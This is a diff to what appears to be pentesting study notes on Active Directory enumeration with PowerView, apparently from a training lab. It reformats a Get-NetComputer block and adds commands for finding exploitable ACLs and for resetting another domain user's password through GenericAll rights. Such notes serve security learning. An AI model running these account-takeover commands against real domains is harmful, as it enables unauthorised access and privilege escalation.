@@ -136,10 +136,9 @@ PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
 
 ### **Enumerating Operating Systems**
 
-```
-Get-NetComputer
-Get-NetComputer | select operatingsystem,dnshostname
-```
+<pre><code>Get-NetComputer
+<strong>Get-NetComputer | select operatingsystem,dnshostname
+</strong></code></pre>
 
 ### **Permissions and Logged on Users**
 
@@ -208,6 +207,19 @@ CORP\stephanie
 {% code title="Enumerating ACLs for the Management Group" overflow="wrap" lineNumbers="true" %}
 ```
 Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+
+```
+{% endcode %}
+
+{% code title="Enumerate interesting ACLs" overflow="wrap" lineNumbers="true" %}
+```
+Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
+```
+{% endcode %}
+
+{% code title="Change a user password where you have GenericALL rights" overflow="wrap" lineNumbers="true" %}
+```
+net user robert Password123! /domain 
 ```
 {% endcode %}
 
